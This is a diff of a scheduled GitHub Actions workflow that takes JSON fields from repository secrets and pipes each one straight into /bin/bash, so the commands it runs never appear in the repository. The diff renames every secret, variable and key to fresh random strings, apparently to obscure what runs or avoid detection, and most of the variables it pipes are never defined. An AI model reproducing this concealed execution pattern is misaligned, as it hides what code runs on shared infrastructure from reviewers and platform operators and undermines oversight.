@@ -1,25 +1,24 @@
 name: kumaozhongqin
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 1/6 * * *'
-
-jobs:  # 17805
+    - cron: '39 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: kumaozhongqin
         env:
-          kh2392: ${{ secrets.kh2392 }}
+          vtlj70: ${{ secrets.vtlj70 }}
         run: |
-          echo $kh2392 | jq -r .cxvdz150 | /bin/bash
-          echo $pwf9388 | jq -r .fokw4612 | /bin/bash
-          echo $mgjrj524 | jq -r .kmy974 | /bin/bash
-          echo $pw3 | jq -r .gveu45 | /bin/bash
-          echo $vd87 | jq -r .oiw49 | /bin/bash
-          echo $ii36 | jq -r .o1 | /bin/bash
-          echo $tw33218 | jq -r .ok21 | /bin/bash
-          echo $sbllq11519 | jq -r .k67 | /bin/bash
+          echo $vtlj70 | jq -r .dlx92 | /bin/bash
+          echo $wvxz21 | jq -r .rqp6 | /bin/bash
+          echo $abirn3 | jq -r .p91 | /bin/bash
+          echo $qrqx152 | jq -r .sfhf5604 | /bin/bash
+          echo $vreg27286 | jq -r .cbty66 | /bin/bash
+          echo $s31804 | jq -r .f75238 | /bin/bash
+          echo $ku4489 | jq -r .fy9705 | /bin/bash
+          echo $fkxig58872 | jq -r .sux0511 | /bin/bash
+          echo $k7 | jq -r .yonmm9837 | /bin/bash
 
